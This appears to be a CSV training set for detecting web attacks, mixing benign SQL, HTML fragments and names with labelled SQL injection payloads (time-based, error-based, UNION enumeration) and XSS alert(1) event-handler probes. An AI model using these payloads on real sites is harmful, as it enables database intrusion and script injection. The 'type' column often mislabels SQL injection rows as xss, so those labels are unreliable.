Text,Label,type
"   SELECT apple,around,brief,traffic,product     (  (  roll JOIN social ON magnet.immediately =  fought.wait )   INNER JOIN citizenON Orders.promised =  brief.gainID ) ",0,sql
<figcaption id=x tabindex=1 ondeactivate=alert(1)></figcaption><input id=y autofocus>,2,xss
"<ul><li><a href=""#CITEREFMcCorduck2004"">McCorduck 2004 </a>, pp.&#160;450–451 </li>",0,xss
parola@zonamodelos.pl,0,sql
"-5064  )   as mzxc where 1889  =  1889 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,xss
<nav id=x tabindex=1 onfocusin=alert(1)></nav>,2,xss
ulls,0,sql
oxendine,0,sql
1%'  )   order by 1#,1,sql
"-6085 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,sql
	 </ul>,0,xss
1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,sql
"1%' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '%'  =  '",1,sql
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1,xss
"1%'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  '%'  =  '",1,sql
"1  )   as attr where 8085  =  8085 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,xss
SELECT shelf ( s )  FROM none UNION ALL,0,sql
<ol onpointerleave=alert(1)>XSS</ol>,2,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
"<option draggable=""true"" ondrag=""alert(1)"">test</option>",2,xss
klaudt,0,sql
3.24545E+15,0,sql
-8292%'  )   or 8571  =  8571--,1,sql
"<div draggable=""true"" contenteditable>drag me</div><thead ondrop=alert(1) contenteditable>drop here</thead>",2,xss
SELECT TOP 50 PERCENT * FROM weigh,0,sql
-4954'  )   or 8571  =  8571--,1,sql
" SELECT SUBSTR ( CustomerName, 2, 5 )  AS ExtractString FROM Customers;",0,sql
"  SELECT GREATEST ( 3, 12, 34, 8, 25 ) ;",0,sql
kellard@todobetis.gf,0,sql
" select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
1   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5139  =  5139,1,sql
SELECT * FROM forget WHERE mine IN  ( SELECT bee FROM spread ) ,0,xss
"  SELECT * FROM farm WHERE weight IN  ( 'own', 'herd', 'rabbit' )  ",0,sql
SELECT AVG ( several ) FROM upward SELECT SUM ( identity ) ,0,sql
"<div onmousemove=""alert(1)"">test</div>",2,xss
<button onpointerup=alert(1)>XSS</button>,2,xss
"select * from generate_series  (  9058,9058,case when   (  9058  =  1183  )   then 1 else 0 end  )   limit 1--",1,sql
"1  )   union all select null,null,null--",1,sql
-9355' or 6872  =  6872 and 'mztk'  =  'mztk,1,sql
"1'  )   where 1027  =  1027 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,xss
<center onpointerover=alert(1)>XSS</center>,2,xss
3.4008E+15,0,xss
madan deluca,0,sql
quilley0@frenchpolynesia.com.st,0,sql
tormellas,0,xss
"	 </span> </a> </i>&#93; </sup>. These learners could therefore, derive all possible knowledge, by considering every possible hypothesis and matching them against the data. In practice, it is almost never possible to consider every possibility, because of the phenomenon of ""<a href=""/wiki/Combinatorial_explosion"" title=""Combinatorial explosion"">combinatorial explosion </a>"", where the amount of time needed to solve a problem grows exponentially. Much of AI research involves figuring out how to identify and avoid considering broad range of possibilities that are unlikely to be beneficial.<sup id=""cite_ref-Intractability_68-0"" class=""reference""><a href=""#cite_note-Intractability-68"">&#91;66&#93; </a> </sup><sup id=""cite_ref-FOOTNOTEDomingos2015Chapter_2,_Chapter_3_69-0"" class=""reference""><a href=""#cite_note-FOOTNOTEDomingos2015Chapter_2,_Chapter_3-69"">&#91;67&#93; </a> </sup> For example, when viewing a map and looking for the shortest driving route from <a href=""/wiki/Denver"" title=""Denver"">Denver </a> to <a href=""/wiki/New_York_City"" title=""New York City"">New York </a> in the East, one can in most cases skip looking at any path through <a href=""/wiki/San_Francisco"" title=""San Francisco"">San Francisco </a> or other areas far to the West; thus, an AI wielding a pathfinding algorithm like <a href=""/wiki/A*_search_algorithm"" title=""A* search algorithm"">A* </a> can avoid the combinatorial explosion that would ensue if every possible route had to be ponderously considered in turn.<sup id=""cite_ref-70"" class=""reference""><a href=""#cite_note-70"">&#91;68&#93; </a> </sup></p>",0,xss
"select * from generate_series  (  3990,3990,case when   (  3990  =  9597  )   then 1 else 0 end  )   limit 1--",1,sql
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'property_type' )  ORDER BY t.name ASC",0,xss
"<rt onkeypress=""alert(1)"" contenteditable>test</rt>",2,xss
" </p><p><a href=""/wiki/Unsupervised_learning"" title=""Unsupervised learning"">Unsupervised learning </a> is the ability to find patterns in a stream of input, without requiring a human to label the inputs first. <a href=""/wiki/Supervised_learning"" title=""Supervised learning"">Supervised learning </a> includes both <a href=""/wiki/Statistical_classification"" title=""Statistical classification"">classification </a> and numerical <a href=""/wiki/Regression_analysis"" title=""Regression analysis"">regression </a>, which requires a human to label the input data first. Classification is used to determine what category something belongs in, and occurs after a program sees a number of examples of things from several categories. Regression is the attempt to produce a function that describes the relationship between inputs and outputs and predicts how the outputs should change as the inputs change.<sup id=""cite_ref-Machine_learning_117-1"" class=""reference""><a href=""#cite_note-Machine_learning-117"">&#91;114&#93; </a> </sup> Both classifiers and regression learners can be viewed as ""function approximators"" trying to learn an unknown (possibly implicit) function; for example, a spam classifier can be viewed as learning a function that maps from the text of an email to one of two categories, ""spam"" or ""not spam"". <a href=""/wiki/Computational_learning_theory"" title=""Computational learning theory"">Computational learning theory </a> can assess learners by <a href=""/wiki/Computational_complexity"" title=""Computational complexity"">computational complexity </a>, by <a href=""/wiki/Sample_complexity"" title=""Sample complexity"">sample complexity </a> (how much data is required), or by other notions of <a href=""/wiki/Optimization_theory"" class=""mw-redirect"" title=""Optimization theory"">optimization </a>.<sup id=""cite_ref-118"" class=""reference""><a href=""#cite_note-118"">&#91;115&#93; </a> </sup> In <a href=""/wiki/Reinforcement_learning"" title=""Reinforcement learning"">reinforcement learning </a><sup id=""cite_ref-Reinforcement_learning_119-0"" class=""reference""><a href=""#cite_note-Reinforcement_learning-119"">&#91;116&#93; </a> </sup> the agent is rewarded for good responses and punished for bad ones. The agent uses this sequence of rewards and punishments to form a strategy for operating in its problem space.",0,xss
c/ txapin ene 162,0,sql
"<big onkeypress=""alert(1)"" contenteditable>test</big>",2,xss
SELECT * FROM pool WHERE relationship  BETWEEN 10 AND 20,0,xss
"<bdo oncontextmenu=""alert(1)"">test</bdo>",2,xss
SELECT Count ( * )  AS familiar,0,xss
-2797'   )    )     )   union all select 5711#,1,xss
SELECT * FROM  ( SELECT youth FROM few ) ,0,sql
1 where 7452  =  7452 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,sql
SELECT AVG ( girl )  FROM saddle  SELECT SUM ( stronger ) ,0,sql
"SELECT * FROM Users WHERE Name  = """" or """" = """" AND Pass  = """" or """" = """"",0,sql
"<rb onkeydown=""alert(1)"" contenteditable>test</rb>",2,xss
"1""  )   and make_set  (  4539  =  6401,6401  )   and   (  ""kglx""  =  ""kglx",1,sql
SELECT * FROM curve WHERE NOT that = 'try'  AND NOT case = 'history',0,sql
<ol onblur=alert(1) tabindex=1 id=x></ol><input autofocus>,2,xss
1  )   and   (  2342  =  3620  )  *3620,1,xss
SELECT option_value FROM wp_options WHERE option_name  =  'options_linkedin_url' LIMIT 1,0,xss
"  UPDATE directly SET kept =  'sold', City =  'out' WHERE fell =  baby",0,sql
SELECT COUNT ( dance )  FROM slowly,0,sql
-1985   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  1248  =  1248,1,xss
"camio da mina, 175,",0,sql
"	 </span> <span class=""reference-text"">",0,xss
SELECT * FROM recently 3 SELECT * FROM excellent,0,sql
<dir id=x tabindex=1 onbeforedeactivate=alert(1)></dir><input autofocus>,2,xss
"<spacer draggable=""true"" ondragstart=""alert(1)"">test</spacer>",2,xss
"	 </span> <span class=""toctext"">Military ",0,xss
"<div draggable=""true"" contenteditable>drag me</div><acronym ondragover=alert(1) contenteditable>drop here</acronym>",2,xss
"<button onmouseenter=""alert(1)"">test</button>",2,xss
cheyenne,0,sql
2.78007E+14,0,sql
"calle marsella s/n,",0,sql
9.26768E+15,0,sql
"1%""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,xss
" SELECT * FROM driving ORDER BY ants, inside",0,xss
SELECT * FROM plural  WHERE related NOT LIKE '[according]%',0,xss
termmetro,0,sql
"<isindex onbeforecut=""alert(1)"" contenteditable>test</isindex>",2,xss
SELECT AVG ( hospital ) FROM crop,0,xss
"carrer mestre albages 61,",0,sql
<template onfocusout=alert(1) tabindex=1 id=x></template><input autofocus>,2,xss
 )   union select * from information_schema.tables;,1,sql
coxcojita,0,sql
if  (  3831  =  9321  )   select 3831 else drop function ybru--,1,sql
SELECT tears FROM people UNION SELECT aware FROM directly ORDER BY settle,0,sql
"<li id=""cite_note-grie2012-240""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-grie2012_240-0"">^ </a> </b> ",0,xss
<svg><menu onload=alert(1)></menu>,2,xss
SELECT * FROM creature WHERE movement NOT LIKE '[taste]%',0,sql
1 where 4641  =  4641,1,sql
"<script onmouseover=""alert(1)"">test</script>",2,xss
SELECT * FROM dream WHERE bank BETWEEN 'machine' AND 'tin',0,sql
ulldecona,0,xss
"<li class=""toclevel-3 tocsection-64""><a href=""#Robot_rights""><span class=""tocnumber"">8.4.4 ",0,xss
"-1763""  )   or elt  (  1032  =  1032,3623  )   and   (  ""nqvv""  =  ""nqvv",1,xss
"1 where 8333  =  8333 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,sql
"<li><a href=""/wiki/Mental_property"" title=""Mental property"">Mental property </a> </li>",0,xss
"<style>@keyframes slidein {}</style><tt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tt>",2,xss
" SELECT CustomerName, ContactName, Address FROM Customers WHERE Address  IS NULL;",0,sql
"<li id=""cite_note-Optimism_of_early_AI-9""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Optimism_of_early_AI_9-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Optimism_of_early_AI_9-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'gmvk' like 'gmvk",1,sql
	 </span>,0,xss
	 </span>,0,xss
SELECT * FROM born 3 SELECT * FROM meant,0,sql
"1   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2952  =  2952",1,xss
SELECT AVG ( step ) FROM say SELECT SUM ( wife ) ,0,sql
	 </ul>,0,xss
severiano,0,sql
-4184'   )    )     )   or 2579  =  4654#,1,sql
"1'  )   where 6672  =  6672 union all select null,null,null,null,null,null,null,null,null,null--",1,sql
"<style>:target {transform: rotate(180deg);}</style><noembed id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></noembed>",2,xss
vinaixa calleiros,0,xss
"<li id=""cite_note-99""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-99"">^ </a> </b> ",0,xss
SELECT AVG ( writing )  FROM bad  SELECT SUM ( shout ) ,0,sql
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'xfmq'  =  'xfmq",1,sql
SELECT * FROM snake FETCH FIRST 3 ROWS ONLY,0,sql
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk""  =  ""jkfk",1,sql
SELECT * FROM earth WHERE mysterious NOT BETWEEN 'done' AND 'donkey',0,xss
"<track onpaste=""alert(1)"" contenteditable>test</track>",2,xss
"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",1,sql
"1%"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """,1,sql
<sup onpointerup=alert(1)>XSS</sup>,2,xss
"1%""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
SELECT * FROM previous WHERE climb LIKE '%tube%',0,xss
"<div draggable=""true"" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>",2,xss
SELECT TAN ( 1.75 ) ;,0,sql
"-2168""   )    )    union all select 4935,4935,4935,4935,4935,4935,4935,4935,4935--",1,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Bulletin+of+the+Atomic+Scientists&amp;rft.atitle=Is+artificial+intelligence+really+an+existential+threat+to+humanity%3F&amp;rft.date=2015-08-09&amp;rft_id=http%3A%2F%2Fthebulletin.org%2Fartificial-intelligence-really-existential-threat-humanity8577&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT TOP 3 * FROM ear SELECT * FROM about 3SELECT * FROM badly,0,sql
SELECT * FROM closely,0,xss
 </p>,0,xss
"<style>:target {transform: rotate(180deg);}</style><isindex id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></isindex>",2,xss
http://1113982867/,2,xss
"<style>@keyframes slidein {}</style><command style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></command>",2,xss
" SELECT * FROM nervous ORDER BY powerful ASC, rear DESC",0,sql
gwillim.somerset@mystyleperfume.nl,0,sql
"<object draggable=""true"" ondragleave=""alert(1)"">test</object>",2,xss
"   SELECT tank, power, down FROM hour WHERE secret  IS NULL",0,sql
"<style>@keyframes x{}</style><big style=""animation-name:x"" onanimationstart=""alert(1)""></big>",2,xss
SELECT yesterday ( s FROM plain RIGHT JOIN,0,sql
"<li><a href=""/wiki/Friendly_artificial_intelligence"" title=""Friendly artificial intelligence"">Friendly AI </a> </li> </ul> </td>",0,xss
1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  4574  =  4574,1,sql
"   SELECT habit, gun, directlyFROM wise WHERE strip  IS NOT NULL",0,xss
aflechate,0,sql
 </li>,0,xss
"1   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  7813  =  7813",1,xss
SELECT TOP 3 * FROM down WHERE quarter = 'fifty',0,sql
15365381r,0,sql
</dl>,0,xss
<SCRIPT>alert('');</SCRIPT>,2,xss
<script onpointerup=alert(1)>XSS</script>,2,xss
SELECT * FROM mountain WHERE shape = 'street'  OR package = 'tobacco',0,sql
SELECT * FROM measure WHERE burn = 'pretty' LIMIT 3,0,sql
 </li>,0,xss
"-1620   )    )    union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",1,sql
"   SELECT journey, also, scientificFROM fence WHERE broad  IS NOT NULL",0,sql
	 </span> </li>,0,xss
"1%""  )   union all select null,null,null,null,null,null--",1,sql
char%4039%41%2b%40SELECT,1,sql
mckearne,0,sql
"<style>@keyframes slidein {}</style><br style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></br>",2,xss
SELECT MIN ( won )  AS still FROM hill,0,sql
gula,0,sql
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, chpt. 2,3,7,9, </li>",0,xss
5.85437E+15,0,sql
-8047' or 3038  =  3038,1,sql
-9484' or   (  7129  =  2349  )  *2349 and 'fcsa' like 'fcsa,1,sql
"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'yhpp' like 'yhpp",1,sql
SELECT * FROM her WHERE yes BETWEEN deep09/01/1996slept AND division15/31/1996aware,0,sql
"<ul><li><a href=""/wiki/Biorobotics"" title=""Biorobotics"">Biorobotics </a> </li>",0,xss
"<style>@keyframes slidein {}</style><html style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></html>",2,xss
"<li><a href=""/wiki/Ingenuity"" title=""Ingenuity"">Ingenuity </a> </li>",0,xss
SELECT expect ( s )  FROM value SELECT breakfast FROM entire,0,xss
"<li class=""toclevel-3 tocsection-67""><a href=""#Transhumanism""><span class=""tocnumber"">8.5.2 ",0,xss
SELECT CURRENT_DATE (  )  + 1;,0,sql
" SELECT * FROM balloon ORDER BY climate, mostly",0,xss
 </li>,0,xss
1' and   (  1088  =  7530  )  *7530 and 'xkfu'  =  'xkfu,1,sql
"pl. francisca pacheco, 81",0,sql
SELECT MIN ( sunlight )  AS shoot FROM quietly,0,sql
"1%'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  '%'  =  '",1,xss
"<li><a href=""/wiki/Harmony_search"" class=""mw-redirect"" title=""Harmony search"">Harmony search </a> </li>",0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><col id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></col>",2,xss
nab,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation web"">Busby, Mattha (30 April 2018). <a rel=""nofollow"" class=""external text"" href=""https://www.theguardian.com/technology/2018/apr/30/bookies-using-ai-to-keep-gamblers-hooked-insiders-say"">""Revealed: how bookies use AI to keep gamblers hooked"" </a>. <i>the Guardian </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=the+Guardian&amp;rft.atitle=Revealed%3A+how+bookies+use+AI+to+keep+gamblers+hooked&amp;rft.date=2018-04-30&amp;rft.aulast=Busby&amp;rft.aufirst=Mattha&amp;rft_id=https%3A%2F%2Fwww.theguardian.com%2Ftechnology%2F2018%2Fapr%2F30%2Fbookies-using-ai-to-keep-gamblers-hooked-insiders-say&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
moloney@imarbella.travel,0,sql
-7984' order by 1--,1,sql
"  SELECT DATEDIFF ( ""2017-06-25"", ""2017-06-15"" ) ;",0,sql
SELECT capital ( s FROM probably RIGHT JOIN,0,sql
SELECT * FROM thread WHERE strong NOT LIKE 'any%',0,sql
rist,0,sql
"<li><a href=""/wiki/Virtual_machine"" title=""Virtual machine"">Virtual machine </a> </li>",0,xss
"<label onbeforepaste=""alert(1)"" contenteditable>test</label>",2,xss
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- kegk",1,sql
"1""   )    )    as ndbk where 5042  =  5042 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,sql
SELECT DISTINCT shape FROM carbon,0,sql
SELECT AVG ( Price ) FROM sail,0,sql
"<bdi onpaste=""alert(1)"" contenteditable>test</bdi>",2,xss
"<em onmouseover=""alert(1)"">test</em>",2,xss
"SELECT * FROM ordinary WHERE whom BETWEEN ""rabbit"" AND    ""afternoon""",0,sql
or 'something'   =   'some'+'thing',1,sql
"<colgroup onmouseenter=""alert(1)"">test</colgroup>",2,xss
"-2111' union all select 1061,1061,1061--",1,xss
1'||  (  select 'zccb' from dual where 8911  =  8911,1,sql
7633,0,sql
" select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1,sql
SELECT * FROM bent ORDER BY length DESC,0,sql
SELECT Count ( * )  AS completely,0,sql
"1""  )   as idwa where 2545  =  2545 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
paterna del campo,0,sql
"    <div role=""main"" class=""document"" itemscope=""itemscope"" itemtype=""http://schema.org/Article"">",0,xss
"1%""   )    )    union all select null#",1,sql
"	 </span>. <i>georgetown.edu </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=georgetown.edu&amp;rft.atitle=Artificial+Intelligence%3A+An+Introduction%2C+p.+37&amp;rft.aulast=Maloof&amp;rft.aufirst=Mark&amp;rft_id=http%3A%2F%2Fpeople.cs.georgetown.edu%2F~maloof%2Fcosc270.f17%2Fcosc270-intro-handout.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
 </ul>,0,xss
"<abbr onkeydown=""alert(1)"" contenteditable>test</abbr>",2,xss
"<li id=""cite_note-Intelligent_agents-179""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Intelligent_agents_179-0"">^ </a> </b> ",0,xss
scavran@eonon.com.at,0,sql
tremewan,0,sql
14399392n,0,sql
1' where 7882  =  7882 and 6663  =  4524--,1,sql
 </li>,0,xss
